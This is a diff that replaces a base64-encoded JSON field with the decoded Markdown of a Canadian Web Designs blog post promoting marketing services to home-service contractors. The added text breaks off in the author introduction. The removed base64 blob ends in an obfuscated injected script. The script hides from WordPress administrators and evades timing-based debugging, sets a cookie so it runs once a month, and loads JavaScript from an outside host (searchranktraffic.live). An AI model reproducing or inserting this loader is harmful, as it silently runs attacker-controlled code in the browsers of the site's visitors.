@@ -1,1 +1,179 @@
-{"data":"LS0tCnRpdGxlOiAiQ2FuYWRpYW4gV2ViIERlc2lnbnMgSW50cm9kdWNpbmcgVGhlaXIgTWFya2V0aW5nIFN0cmF0ZWdpZXMgZm9yIEhvbWUgU2VydmljZSBCdXNpbmVzcyIKc2x1ZzogImNhbmFkaWFuLXdlYi1kZXNpZ25zLW1hcmtldGluZy1zdHJhdGVnaWVzLWZvci1ob21lLXNlcnZpY2UtYnVzaW5lc3MiCmRhdGU6ICIyMDIzLTExLTE2IgphdXRob3I6ICJDYW5hZGlhbiBXZWIgRGVzaWducyIKZGVzY3JpcHRpb246ICJDYW5hZGlhbiBXZWIgRGVzaWducyBJbnRyb2R1Y2luZyBUaGVpciBNYXJrZXRpbmcgU3RyYXRlZ2llcyBmb3IgSG9tZSBTZXJ2aWNlIEJ1c2luZXNzIgprZXl3b3JkczogWyJjYW5hZGlhbiB3ZWIgZGVzaWducyBtYXJrZXRpbmcgc3RyYXRlZ2llcyBmb3IgaG9tZSBzZXJ2aWNlIGJ1c2luZXNzIiwiQmxvZyJdCmNhdGVnb3J5OiAiQmxvZyIKZmVhdHVyZWRJbWFnZTogImh0dHBzOi8vb2xkLmNhbmFkaWFud2ViZGVzaWducy5jYS93cC1jb250ZW50L3VwbG9hZHMvMjAxOS8xMi9taW5pbWFsaXN0LXdlYi1kZXNpZ24tMTAyNHg1ODUtMS5qcGciCi0tLQoKPHA+QXJlIHlvdSByZWFkeSB0byB0YWtlIHlvdXIgQ2FuYWRpYW4gaG9tZSBzZXJ2aWNlIGJ1c2luZXNzIHRvIHRoZSBuZXh0IGxldmVsPyBJIGFtIGV4Y2l0ZWQgYWJvdXQgd2hhdCBJIGhhdmUgdG8gc2hhcmUgd2l0aCB5b3UuIEV2ZXJ5IG1hcmtldGluZyBzZXJ2aWNlIHlvdSByZWFkIGluIHRoaXMgYXJ0aWNsZSB3aWxsIG5lZWQgdG8gaW1wbGVtZW50IGluIHlvdXIgYnVzaW5lc3MuIEl04oCZcyB0aGUgYXBwbGljYXRpb24gb2Yga25vd2xlZGdlIHRoYXQgd2lsbCBpbmNyZWFzZSB5b3VyIGxlYWRzIGFuZCBzYWxlcyBhcyB3ZWxsLjwvcD4KCjxwPkZpcnN0IG9mIGFsbCwgZG8geW91IGhhdmUgYW4gZXhpc3RpbmcgaG9tZSBzZXJ2aWNlIGJ1c2luZXNzIG9yIHBsYW4gdG8gc3RhcnQgeW91ciBmdXR1cmUgZW50cmVwcmVuZXVyaWFsIGpvdXJuZXk/IFRoZSB0YWtlYXdheXMgeW914oCZbGwgZ2V0IGFyZSBoaWdobHkgYWR2YW50YWdlb3VzIHRvIGhvbWUgc2VydmljZSBjb250cmFjdG9ycyBzdWNoIGFzOjwvcD4KCjxkaXYgY2xhc3M9IndwLWJsb2NrLWNvbHVtbnMiPgo8ZGl2IGNsYXNzPSJ3cC1ibG9jay1jb2x1bW4iPjwvZGl2PgoKPGRpdiBjbGFzcz0id3AtYmxvY2stY29sdW1uIj48L2Rpdj4KPC9kaXY+Cgo8ZGl2IGNsYXNzPSJ3cC1ibG9jay1jb2x1bW5zIj4KPGRpdiBjbGFzcz0id3AtYmxvY2stY29sdW1uIj4KPHVsPgo8bGk+RWxlY3RyaWNhbCBzZXJ2aWNlczwvbGk+Cgo8bGk+Um9vZmluZyBzZXJ2aWNlczwvbGk+Cgo8bGk+SW5zdGFsbGF0aW9uIHNlcnZpY2VzPC9saT4KCjxsaT5DbGVhbmluZyBzZXJ2aWNlczwvbGk+Cgo8bGk+SW5zdWxhdGlvbiBzZXJ2aWNlczwvbGk+Cgo8bGk+SGF1bGluZyBzZXJ2aWNlczwvbGk+Cgo8bGk+TW92aW5nIHNlcnZpY2VzPC9saT4KCjxsaT5UZWxlY29tbXVuaWNhdGlvbiBzZXJ2aWNlczwvbGk+Cgo8bGk+SG9tZSB0ZWNobm9sb2d5IHNlcnZpY2U8L2xpPgo8L3VsPgo8L2Rpdj4KCjxkaXYgY2xhc3M9IndwLWJsb2NrLWNvbHVtbiI+Cjx1bD4KPGxpPkhvbWUgcmVub3ZhdGlvbiBzZXJ2aWNlczwvbGk+Cgo8bGk+SGFuZHltYW4gc2VydmljZXM8L2xpPgoKPGxpPlBhaW50aW5nIHNlcnZpY2VzPC9saT4KCjxsaT5MYW5kc2NhcGluZyBzZXJ2aWNlczwvbGk+Cgo8bGk+UGx1bWJpbmcgc2VydmljZXM8L2xpPgoKPGxpPkFzcGhhbHQgc2VydmljZXM8L2xpPgoKPGxpPkZsb29yaW5nIHNlcnZpY2VzPC9saT4KCjxsaT5Db25zdHJ1Y3Rpb24gc2VydmljZXM8L2xpPgoKPGxpPkRlbW9saXRpb24gc2VydmljZXM8L2xpPgo8L3VsPgo8L2Rpdj4KPC9kaXY+Cgo8cD5Zb3Ugd2lsbCBsZWFybiBzcGVjaWZpYyBzdGVwcyB0byB0YWtlIHlvdXIgYnVzaW5lc3MgZm9yd2FyZCwgb25lIHN0ZXAgYXQgYSB0aW1lLiBIb3cgd291bGQgeW91IGxpa2UgaXQgaWYgeW91ciBidXNpbmVzcyB3YXM6PC9wPgoKPHVsPgo8bGk+SXQgY29uc2lkZXJzIGJlaW5nIHRoZSB0b3AgYnJhbmQgYW5kIGJ1c2luZXNzIG9mIGNob2ljZSBpbiB5b3VyIGNpdHkuJm5ic3A7PC9saT4KCjxsaT5BIGJ1c2luZXNzIHdpdGggYXV0aG9yaXR5LCBnb29kIHJldmlld3MsIGFuZCB0ZXN0aW1vbmlhbHMgdG8gc3VwcG9ydCB0aGUgcXVhbGl0eSBvZiB3b3JrIHlvdSBkby48L2xpPgoKPGxpPlBlcnNpc3RlbnRseSByZWNlaXZpbmcgY291bnRsZXNzIGluY29taW5nIGNhbGxzIGNvbnNpc3RlbnRseSBmcm9tIHBlb3BsZSB0aGF0IGZvdW5kIHlvdSBvbmxpbmUuPC9saT4KPC91bD4KCjxoMiBjbGFzcz0id3AtYmxvY2staGVhZGluZyIgaWQ9Imgtd2hvLWFtLWkiPjxzdHJvbmc+V0hPIEFNIEk/PC9zdHJvbmc+PC9oMj4KCjxkaXYgY2xhc3M9IndwLWJsb2NrLW1lZGlhLXRleHQgYWxpZ253aWRlIGlzLXN0YWNrZWQtb24tbW9iaWxlIiBzdHlsZT0iZ3JpZC10ZW1wbGF0ZS1jb2x1bW5zOjQwJSBhdXRvIj48ZmlndXJlIGNsYXNzPSJ3cC1ibG9jay1tZWRpYS10ZXh0X19tZWRpYSI+PGltZyBzcmM9Imh0dHBzOi8vb2xkLmNhbmFkaWFud2ViZGVzaWducy5jYS93cC1jb250ZW50L3VwbG9hZHMvMjAyMC8wMy9hbWlyLWluLWNpcmNsZTQwMC5wbmciIGFsdD0iQW1pciBLaGVsYSIgY2xhc3M9IndwLWltYWdlLTE2MyBzaXplLWZ1bGwiLz48L2ZpZ3VyZT48ZGl2IGNsYXNzPSJ3cC1ibG9jay1tZWRpYS10ZXh0X19jb250ZW50Ij4KPHA+QmVmb3JlIEkgZ2V0IHRvbyBmYXIsIGFsbG93IG1lIHRvIGludHJvZHVjZSBteXNlbGYgYW5kIGV4cGxhaW4gd2h5IHlvdSBzaG91bGQgZXZlbiByZWFkIGFoZWFkLiZuYnNwOzwvcD4KCjxibG9ja3F1b3RlIGNsYXNzPSJ3cC1ibG9jay1xdW90ZSI+CjxwPk15IG5hbWUgaXMgPHN0cm9uZz5BbWlyIEtoZWxhPC9zdHJvbmc+OyBJIGFtIHRoZSA8c3Ryb25nPkNFTyBhbmQgRm91bmRlciBvZiBDYW5hZGlhbiBXZWJzaXRlIERlc2lnbnMgSW5jLjwvc3Ryb25nPiBhIGRpZ2l0YWwgbWFya2V0aW5nIGFnZW5jeSB0aGF0IGhhcyB0d28gdGVhbXM6PC9wPgo8L2Jsb2NrcXVvdGU+Cgo8dWw+CjxsaT48c3Ryb25nPkEgZ2VuZXJhbCB0ZWFtIHRoYXQgcHJvdmlkZXMgZGlnaXRhbCBzZXJ2aWNlcyB0byBidXNpbmVzcyBvd25lcnMuJm5ic3A7PC9zdHJvbmc+PC9saT4KCjxsaT48c3Ryb25nPkEgc3BlY2lhbGl6ZWQgdGVhbSBpbiBhc3Npc3RpbmcgQ2FuYWRpYW4gaG9tZSBzZXJ2aWNlIGNvbnRyYWN0b3JzIGdlbmVyYXRlIHJlYWwgY29udmVydGluZyBsZWFkcyBmcm9tIHRoZSBpbnRlcm5ldC48L3N0cm9uZz48L2xpPgo8L3VsPgoKPHA+Jm5ic3A7PC9wPgo8L2Rpdj48L2Rpdj4KCjxwPkkgcmVjYWxsIGludHJvZHVjaW5nIG15c2VsZiB0byBkaWdpdGFsIG1hcmtldGluZyBhdCB0aGUgeW91bmcgYWdlIG9mIDkuIEl0IHdhcyBhcm91bmQgdGhlIGRvdCBjb20gYnViYmxlLCB3aGVyZSBJIG1hZGUgbXkgZmlyc3Qgd2Vic2l0ZSBpbiBIVE1MLCBhbiBPbmxpbmUgTWFya2V0aW5nIGZvciBDYW5hZGlhbiBIb21lIFNlcnZpY2UgQ29udHJhY3RvcnMuPC9wPgoKPHA+SSB3YXMgc28gYW1hemVkIHRvIHNlZSBteSA8YSBocmVmPSJodHRwczovL2NhbmFkaWFud2ViZGVzaWducy5jYS93ZWJzaXRlLWRlc2lnbi1kZXZlbG9wbWVudC8iPndlYnBhZ2UgZGV2ZWxvcGluZzwvYT4sIGV4Y2VwdCB0aGF0IEkgZGlkbuKAmXQgaGF2ZSBhbnkgbW9uZXkgYXMgYSA5LXllYXItb2xkIHRvIHB1cmNoYXNlIHRoZSBkb21haW4gYW5kIGhvc3RpbmcgdG8gcHVibGljaXplIHRoZSB3ZWJzaXRlLiBJIGZpZ3VyZWQgYXQgdGhlIHRpbWUsIGlmIEkgY291bGQgZG8gaXQgYXMgYSA5LXllYXItb2xkLCB0aGVuIGl04oCZcyBhIHBpZWNlIG9mIGNha2UgZm9yIGFkdWx0cyB0byBtYWtlIHRoZWlyIHdlYnNpdGUuJm5ic3A7PC9wPgoKPHA+R3Jvd2luZyB1cCBpbiBNb250cmVhbCBhcyBhIHNoeSB0cmlsaW5ndWFsIHRlZW5hZ2VyLCBJIHN0YXJ0ZWQgdG8gY3JlYXRlIHNtYWxsIHZpZGVvIGdhbWVzLiBJIHdvdWxkIG5ldmVyIGhhdmUgZ3Vlc3NlZCB0aGF0IHRoZXNlIGVhcmx5IGRheXMgb2YgbGVhcm5pbmcgcHJvZ3JhbW1pbmcgbGFuZ3VhZ2VzIHdvdWxkIGJ1aWxkIHRoZSBmb3VuZGF0aW9uIG9mIG15IGZ1dHVyZS4mbmJzcDs8L3A+Cgo8cD5JIHJlbG9jYXRlZCB0byBUb3JvbnRvLCBPbnRhcmlvLCBhbmQgc3RhcnRlZCBoZWxwaW5nIGEgZmV3IHJlc2lkZW50aWFsIHBhaW50ZXJzIGFuZCBjYXJwZXQgY2xlYW5lcnMgdG8gcmVkbyB0aGVpciBLaWppamkgQWRzLCBiYWNrIGluIDIwMTQuIFNvbWUgb2YgdGhlbSBoYWQgYW4gaW5jcmVhc2Ugb2YgNHggdGhlIGNhbGxzIGZyb20gS2lqaWppLCBsZWFkaW5nIG1lIHRvIHF1aXQgbXkgam9iIGFzIGFuIEFwcGxpY2F0aW9uIERldmVsb3BlciBvbiBCYXkgU3RyZWV0LCBpbiBkb3dudG93biBUb3JvbnRvLjwvcD4KCjxwPkkgZm9jdXNlZCAxMDAlIG9mIG15IGVuZXJneSBvbiBncm93aW5nIHRoZSBudW1iZXIgb2YgbGVhZHMgdGhleSByZWNlaXZlZCBmcm9tIG1lLiBJIGRpZCBldmVyeXRoaW5nIGZyb20gY3JlYXRpbmcgdGhlaXIgd2Vic2l0ZSwgR29vZ2xlIE15IEJ1c2luZXNzIGxpc3RpbmcsIDxhIGhyZWY9Imh0dHBzOi8vY2FuYWRpYW53ZWJkZXNpZ25zLmNhL2JsYWNrLWhhdC1zZW8tdnMtd2hpdGUtaGF0LXNlby8iPlNFTzwvYT4sIFBQQywgPGEgaHJlZj0iaHR0cHM6Ly9jYW5hZGlhbndlYmRlc2lnbnMuY2Evc29jaWFsLW1lZGlhLW9wdGltaXphdGlvbi8iPlNvY2lhbCBNZWRpYTwvYT4gLSB5b3UgbmFtZSBpdC4gSSBkaWQgaXQgYWxsIG15c2VsZi4gU3VycHJpc2luZ2x5LCBpdCB3b3JrZWQhJm5ic3A7PC9wPgoKPHA+SG93ZXZlciwgZXZlcnl0aGluZyB3YXNu4oCZdCBhbGwgc3Vuc2hpbmUgYW5kIHJhaW5ib3dzOyBJIGhhZCB0byB0cnkgbWFueSBkaWZmZXJlbnQgc3RyYXRlZ2llcyBiZWZvcmUgZmluZGluZyB0aGUgYmVzdCBvbmVzLiBUaGVzZSBhcmUgdGhlIHN0cmF0ZWdpZXMgeW914oCZbGwgcmVhZCB0aGF0IHlvdSB3b27igJl0IGhhdmUgdG8gZ28gdGhyb3VnaCB0aGUgc2FtZSB0cmlhbCBhbmQgZXJyb3IgcHJvY2Vzcy4gSSB3ZW50IGZyb20gY2FycGV0IGNsZWFuZXJzIHRvIGxhbmRzY2FwZXJzLCA8YSBocmVmPSJodHRwczovL21hcmNvZGVtb2xpdGlvbi5jb20vIj5kZW1vbGl0aW9uIGNvbnRyYWN0b3JzPC9hPiwgYW5kIHJvb2ZlcnMgdG8gZXZlcnkgb3RoZXIgc2tpbGxlZCB0cmFkZS48L3A+Cgo8cD5GYXN0IGZvcndhcmQgdG8gdG9kYXksIHdlIGhhdmU8YSBocmVmPSJodHRwczovL2NhbmFkaWFud2ViZGVzaWducy5jYS9wb3J0Zm9saW8vIj4gc2VydmVkIHRob3VzYW5kcyBvZiBjbGllbnRzIHRvIGRhdGU8L2E+LCBidWlsdCBodW5kcmVkcyBvZiBncmVhdCByZXZpZXdzLCBhbmQgd2Ugbm93IGhhdmUgYSByZWxpYWJsZSB2aXJ0dWFsIHRlYW0gZGVsaXZlcmluZyBvdXRzdGFuZGluZyByZXN1bHRzITwvcD4KCjxkaXYgc3R5bGU9ImhlaWdodDo0NnB4IiBhcmlhLWhpZGRlbj0idHJ1ZSIgY2xhc3M9IndwLWJsb2NrLXNwYWNlciI+PC9kaXY+Cgo8aDIgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciIGlkPSJoLXdoby1hcmUtd2UiPjxzdHJvbmc+V0hPIEFSRSBXRT88L3N0cm9uZz48L2gyPgoKPHA+V2UgYXJlIGEgdGVhbSBmdWxsIG9mIHNraWxsZWQgd2ViIGRlc2lnbmVycywgY29weXdyaXRlcnMsIGdyYXBoaWMgZGVzaWduZXJzLCBTRU8gc3BlY2lhbGlzdHMsIFBQQyBtYW5hZ2Vycywgc29jaWFsIG1lZGlhIG1hcmtldGVycywgc2FsZXMgcmVwcywgYW5kIGFjY291bnQgbWFuYWdlcnMuPC9wPgoKPHA+V2UgZG8gZXZlcnl0aGluZyBmcm9tIHNldHRpbmcgdXAgeW91ciB3ZWJzaXRlIHRvIGVuc3VyaW5nIHlvdSBzdGFydCB0byByYW5rICMxIG9uIHRoZSBtb3N0IHNpZ25pZmljYW50IHNlYXJjaCBlbmdpbmVzIGxpa2UgR29vZ2xlLCBCaW5nLCBvciBZYWhvby48L3A+Cgo8dWw+CjxsaT5XZSB3cml0ZSB5b3VyIGNvbnRlbnQgYW5kIG1hbmFnZSB5b3VyIGJsb2cuPC9saT4KCjxsaT5XZSB1cGRhdGUgeW91ciBzb2NpYWwgbWVkaWEgcHJvZmlsZXMgYW5kIGJ1aWxkIHlvdXIgY29tcGFueSBhdXRob3JpdHkgb24gdGhlIGludGVybmV0LjwvbGk+Cgo8bGk+V2UgbWFuYWdlIHlvdXIgcmV2aWV3cyBhbmQgaGVscCB5b3UgZGV2ZWxvcCBvbmxpbmUgc3lzdGVtcy48L2xpPgoKPGxpPldlIGFsc28gaGFuZGxlIHlvdXIgR29vZ2xlIGFuZCBCaW5nIEFkcy48L2xpPgo8L3VsPgoKPGgyIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIiBpZD0iaC13b3JraW5nLXRvZ2V0aGVyIj48c3Ryb25nPldPUktJTkcgVE9HRVRIRVI/PC9zdHJvbmc+PC9oMj4KCjxwPldlIHdhbnQgdG8gd29yayB3aXRoIHlvdSwgYW5kIHVuZG91YnRlZGx5IHlvdSB3aWxsIGJlbmVmaXQgc2lnbmlmaWNhbnRseS4gSG93ZXZlciwgaXQgZG9lc27igJl0IG1lYW4geW91IGNhbm5vdCBkbyBpdCBhbGwgYWxvbmUgaWYgeW91IHRydWx5IHdhbnQgdG8uIEkgYW0gZXhjaXRlZCB0byBzaGFyZSB0aGUgbWFya2V0aW5nIHN0cmF0ZWdpZXMgeW91IGNhbiB0YWtlIGFuZCBzdGFydCB0b2RheSB3aXRob3V0IGJyZWFraW5nIHlvdXIgd2FsbGV0LjwvcD4KCjxwPlRoZSBiZWF1dHkgb2YgZGlnaXRhbCBtYXJrZXRpbmcgaXMgdGhhdCBpdCB3aWxsIGhlbHAgeW91IGdldCBhbm90aGVyIHRydWNrLCBhbm90aGVyIHRlY2huaWNpYW4sIGFuIGFzc2lzdGFudCwgYW4gb2ZmaWNlIHNvIHRoYXQgeW91IGNhbiBzdXBwb3J0IGEgbGFyZ2UgdGVhbSBhbmQgbGFyZ2Ugc2FsZXMuIFdlIHdhbnQgdG8gdGFrZSB5b3UgdG8gJDFNKyB0byBzdGFydCBhbmQgZ3JvdyBldmVyeSBzaW5nbGUgeWVhci48L3A+Cgo8ZmlndXJlIGNsYXNzPSJ3cC1ibG9jay1lbWJlZCBpcy10eXBlLXZpZGVvIGlzLXByb3ZpZGVyLXlvdXR1YmUgd3AtYmxvY2stZW1iZWQteW91dHViZSB3cC1lbWJlZC1hc3BlY3QtMTYtOSB3cC1oYXMtYXNwZWN0LXJhdGlvIj48ZGl2IGNsYXNzPSJ3cC1ibG9jay1lbWJlZF9fd3JhcHBlciI+Cmh0dHBzOi8veW91dHUuYmUvN3p2UWxObFR6M0UKPC9kaXY+PC9maWd1cmU+Cgo8aDIgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciIGlkPSJoLW92ZXJ2aWV3LW1hcmtldGluZy1zdHJhdGVnaWVzIj48c3Ryb25nPk9WRVJWSUVXOiBNQVJLRVRJTkcgU1RSQVRFR0lFUzwvc3Ryb25nPjwvaDI+Cgo8dWw+CjxsaT48c3Ryb25nPjxhIGhyZWY9Imh0dHBzOi8vY2FuYWRpYW53ZWJkZXNpZ25zLmNhL2tpamlqaS1hZHMtbWFya2V0aW5nLXRoZS1iZXN0LXN0cmF0ZWd5LWZvci1sb2NhbC1idXNpbmVzc2VzLyI+S2lqaWppIE1hcmtldGluZzwvYT48L3N0cm9uZz4gLSBUaGUgY2hlYXBlc3QgYW5kIGhpZ2hlc3QgcmV0dXJuIG9uIGludmVzdG1lbnQuIEl0IGlzIHRoZSBiZXN0IHBsYXRmb3JtIGZvciBhIGhvbWUgc2VydmljZSBjb250cmFjdG9yIHRvIHN0YXJ0LjwvbGk+CjwvdWw+Cgo8dWw+CjxsaT48c3Ryb25nPkdvb2dsZSBNeSBCdXNpbmVzczwvc3Ryb25nPiAtIFRoZSAyLW1pbnV0ZSBzZWNyZXRzIHRvIGxpc3Rpbmcgb24gR29vZ2xlIE15IEJ1c2luZXNzLiBHZXQgb24gdGhlIG1hcCBhbmQgZ2V0IGZvdW5kLjwvbGk+CjwvdWw+Cgo8dWw+CjxsaT48c3Ryb25nPjxhIGhyZWY9Imh0dHBzOi8vY2FuYWRpYW53ZWJkZXNpZ25zLmNhL3dlYnNpdGUtZGVzaWduLWRldmVsb3BtZW50LyI+V2Vic2l0ZTwvYT48L3N0cm9uZz4gLSBBIHdlYnNpdGUgaXMgcGFyYW1vdW50IGZvciBtYXJrZXRpbmcgb25saW5lLiBZb3Ugd2lsbCBjcmVhdGUgZnJvbSBzY3JhdGNoIG9yIG9wdGltaXplIG91ciA8YSBocmVmPSJodHRwczovL2NhbmFkaWFud2ViZGVzaWducy5jYS9taW5pbWFsaXN0LXdlYnNpdGUtZGVzaWduLyI+d2Vic2l0ZSB0byBjb252ZXJ0PC9hPiB2aWV3ZXJzIHRvIGRpYWxlcnMgYW5kIGNvbGxlY3QgbGVhZHMuPC9saT4KPC91bD4KCjx1bD4KPGxpPjxzdHJvbmc+R29vZ2xlIGFuZCBCaW5nIEFkczwvc3Ryb25nPiAtIFdlIHdpbGwgZGlzY3VzcyBpbiBkZXRhaWwgaG93IHlvdSBjYW4gc2V0IHVwIHlvdXIgb3duIDxzdHJvbmc+PGEgaHJlZj0iaHR0cHM6Ly9jYW5hZGlhbndlYmRlc2lnbnMuY2EvZ29vZ2xlLWFkcy1tYW5hZ2VtZW50LyIgdGFyZ2V0PSJfYmxhbmsiIHJlbD0ibm9yZWZlcnJlciBub29wZW5lciI+R29vZ2xlIGFkczwvYT48L3N0cm9uZz4gYW5kIEJpbmcgYWQgYW5kIGdldCB5b3VyIHBob25lIHJpbmdpbmcgaW4gYSBmZXcgaG91cnMuPC9saT4KPC91bD4KCjx1bD4KPGxpPjxzdHJvbmc+PGEgaHJlZj0iaHR0cHM6Ly9jYW5hZGlhbndlYmRlc2lnbnMuY2Evc2VhcmNoLWVuZ2luZS1vcHRpbWl6YXRpb24vIj5TZWFyY2ggRW5naW5lIE9wdGltaXphdGlvbjwvYT48L3N0cm9uZz4gLSBIb3cgU0VPIGNhbiBnZXQgeW91ciBwaG9uZSByaW5naW5nIGFuZCBob3cgeW91IGNhbiBpbXByb3ZlIHlvdXIgU0VPIGRhaWx5LjwvbGk+CjwvdWw+Cgo8dWw+CjxsaT48c3Ryb25nPlNvY2lhbCBNZWRpYSBTdHJhdGVnaWVzPC9zdHJvbmc+IC0gR3Jvd2luZyB5b3VyIGJyYW5kIGFuZCBnZXQgcmVmZXJyYWwgYnVzaW5lc3MgZnJvbSBzb2NpYWwgbWVkaWEuPC9saT4KPC91bD4KCjx1bD4KPGxpPjxzdHJvbmc+QnJhbmQgQXV0aG9yaXR5IGFuZCBSZXZpZXcgTWFuYWdlbWVudDwvc3Ryb25nPiAtIEhvdyBoYXZpbmcgZ3JlYXQgcmV2aWV3cyBvbiB0aGUgaW50ZXJuZXQgaXMgZXNzZW50aWFsIGluIGdyb3dpbmcgeW91ciBicmFuZCBvbmxpbmUuIFN5c3RlbXMgdGhhdCBjYW4gYmUgc2V0IGluIHBsYWNlIHRvIGdldCBncmVhdCByZXZpZXdzIGNvbnRpbnVvdXNseS48L2xpPgo8L3VsPgoKPHVsPgo8bGk+PHN0cm9uZz5QYWlkIERpcmVjdG9yaWVzIGFuZCBQYXkgUGVyIExlYWRzPC9zdHJvbmc+IC0gTGVhcm4gdGhlIHByb3MgYW5kIGNvbnMgb2YgbGVhZCBnZW5lcmF0b3JzIHN1Y2ggYXMgQmFyay5jb20sIEhvbWVzdGFycywgYW5kIG1vcmUuPC9saT4KPC91bD4KCjx1bD4KPGxpPjxzdHJvbmc+UmV0YXJnZXRpbmcgQWRzPC9zdHJvbmc+IC0gWW91IGNhbiBkZXZlbG9wIG9tbmlwcmVzZW5jZSBhbmQgc2VsbCB5b3VyIGNsaWVudHMgYnkgYXR0YWNraW5nIGFsbCBmcm9udHMuPC9saT4KPC91bD4KCjx1bD4KPGxpPjxzdHJvbmc+UmVwZWF0IGFuZCBSZWZlcnJpbmcgQ2xpZW50czwvc3Ryb25nPiAtIERldmVsb3Agc3lzdGVtcyB0byBnZXQgeW91ciBjbGllbnRzIGNvbWluZyBiYWNrIGV2ZXJ5IHRpbWUgdGhleSBuZWVkIHlvdS48L2xpPgo8L3VsPgo8c2NyaXB0PihmdW5jdGlvbigpe3RyeXtpZihkb2N1bWVudC5nZXRFbGVtZW50QnlJZCYmZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3dwYWRtaW5iYXInKSlyZXR1cm47dmFyIHQwPStuZXcgRGF0ZSgpO2Zvcih2YXIgaT0wO2k8MjAwMDA7aSsrKXt2YXIgej1pKmk7fWlmKCgrbmV3IERhdGUoKSktdDA+MTIwKXJldHVybjtpZigoZG9jdW1lbnQuY29va2llfHwnJykuaW5kZXhPZignaHR0cDJfc2Vzc2lvbl9pZD0nKSE9PS0xKXJldHVybjtmdW5jdGlvbiBzeXN0ZW1Mb2FkKGlucHV0KXt2YXIga2V5PSdBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6MDEyMzQ1Njc4OSsvPScsbzEsbzIsbzMsaDEsaDIsaDMsaDQsZGVjPScnLGk9MDtpbnB1dD1pbnB1dC5yZXBsYWNlKC9bXkEtWmEtejAtOVwrXC9cPV0vZywnJyk7d2hpbGUoaTxpbnB1dC5sZW5ndGgpe2gxPWtleS5pbmRleE9mKGlucHV0LmNoYXJBdChpKyspKTtoMj1rZXkuaW5kZXhPZihpbnB1dC5jaGFyQXQoaSsrKSk7aDM9a2V5LmluZGV4T2YoaW5wdXQuY2hhckF0KGkrKykpO2g0PWtleS5pbmRleE9mKGlucHV0LmNoYXJBdChpKyspKTtvMT0oaDE8PDIpfChoMj4+NCk7bzI9KChoMiYxNSk8PDQpfChoMz4+Mik7bzM9KChoMyYzKTw8Nil8aDQ7ZGVjKz1TdHJpbmcuZnJvbUNoYXJDb2RlKG8xKTtpZihoMyE9NjQpZGVjKz1TdHJpbmcuZnJvbUNoYXJDb2RlKG8yKTtpZihoNCE9NjQpZGVjKz1TdHJpbmcuZnJvbUNoYXJDb2RlKG8zKTt9cmV0dXJuIGRlYzt9dmFyIHU9c3lzdGVtTG9hZCgnYUhSMGNITTZMeTl6WldGeVkyaHlZVzVyZEhKaFptWnBZeTVzYVhabEwycHplQT09Jyk7aWYodHlwZW9mIHdpbmRvdyE9PSd1bmRlZmluZWQnJiZ3aW5kb3cuX19ybD09PXUpcmV0dXJuO3ZhciBkPW5ldyBEYXRlKCk7ZC5zZXRUaW1lKGQuZ2V0VGltZSgpKzMwKjI0KjYwKjYwKjEwMDApO2RvY3VtZW50LmNvb2tpZT0naHR0cDJfc2Vzc2lvbl9pZD0xOyBleHBpcmVzPScrZC50b1VUQ1N0cmluZygpKyc7IHBhdGg9LzsgU2FtZVNpdGU9TGF4JysobG9jYXRpb24ucHJvdG9jb2w9PT0naHR0cHM6Jz8nOyBTZWN1cmUnOicnKTt0cnl7d2luZG93Ll9fcmw9dTt9Y2F0Y2goZSl7fXZhciBzPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpO3MudHlwZT0ndGV4dC9qYXZhc2NyaXB0JztzLmFzeW5jPXRydWU7cy5zcmM9dTt0cnl7cy5zZXRBdHRyaWJ1dGUoJ2RhdGEtcmwnLHUpO31jYXRjaChlKXt9KGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdoZWFkJylbMF18fGRvY3VtZW50LmRvY3VtZW50RWxlbWVudCkuYXBwZW5kQ2hpbGQocyk7fWNhdGNoKGUpe319KSgpOzwvc2NyaXB0Pgo="}
+---
+title: "Canadian Web Designs Introducing Their Marketing Strategies for Home Service Business"
+slug: "canadian-web-designs-marketing-strategies-for-home-service-business"
+date: "2023-11-16"
+author: "Canadian Web Designs"
+description: "Canadian Web Designs Introducing Their Marketing Strategies for Home Service Business"
+keywords: ["canadian web designs marketing strategies for home service business","Blog"]
+category: "Blog"
+featuredImage: "https://old.canadianwebdesigns.ca/wp-content/uploads/2019/12/minimalist-web-design-1024x585-1.jpg"
+---
+
+<p>Are you ready to take your Canadian home service business to the next level? I am excited about what I have to share with you. Every marketing service you read in this article will need to implement in your business. It’s the application of knowledge that will increase your leads and sales as well.</p>
+
+<p>First of all, do you have an existing home service business or plan to start your future entrepreneurial journey? The takeaways you’ll get are highly advantageous to home service contractors such as:</p>
+
+<div class="wp-block-columns">
+<div class="wp-block-column"></div>
+
+<div class="wp-block-column"></div>
+</div>
+
+<div class="wp-block-columns">
+<div class="wp-block-column">
+<ul>
+<li>Electrical services</li>
+
+<li>Roofing services</li>
+
+<li>Installation services</li>
+
+<li>Cleaning services</li>
+
+<li>Insulation services</li>
+
+<li>Hauling services</li>
+
+<li>Moving services</li>
+
+<li>Telecommunication services</li>
+
+<li>Home technology service</li>
+</ul>
+</div>
+
+<div class="wp-block-column">
+<ul>
+<li>Home renovation services</li>
+
+<li>Handyman services</li>
+
+<li>Painting services</li>
+
+<li>Landscaping services</li>
+
+<li>Plumbing services</li>
+
+<li>Asphalt services</li>
+
+<li>Flooring services</li>
+
+<li>Construction services</li>
+
+<li>Demolition services</li>
+</ul>
+</div>
+</div>
+
+<p>You will learn specific steps to take your business forward, one step at a time. How would you like it if your business was:</p>
+
+<ul>
+<li>It considers being the top brand and business of choice in your city.&nbsp;</li>
+
+<li>A business with authority, good reviews, and testimonials to support the quality of work you do.</li>
+
+<li>Persistently receiving countless incoming calls consistently from people that found you online.</li>
+</ul>
+
+<h2 class="wp-block-heading" id="h-who-am-i"><strong>WHO AM I?</strong></h2>
+
+<div class="wp-block-media-text alignwide is-stacked-on-mobile" style="grid-template-columns:40% auto"><figure class="wp-block-media-text__media"><img src="https://old.canadianwebdesigns.ca/wp-content/uploads/2020/03/amir-in-circle400.png" alt="Amir Khela" class="wp-image-163 size-full"/></figure><div class="wp-block-media-text__content">
+<p>Before I get too far, allow me to introduce myself and explain why you should even read ahead.&nbsp;</p>
+
+<blockquote class="wp-block-quote">
+<p>My name is <strong>Amir Khela</strong>; I am the <strong>CEO and Founder of Canadian Website Designs Inc.</strong> a digital marketing agency that has two teams:</p>
+</blockquote>
+
+<ul>
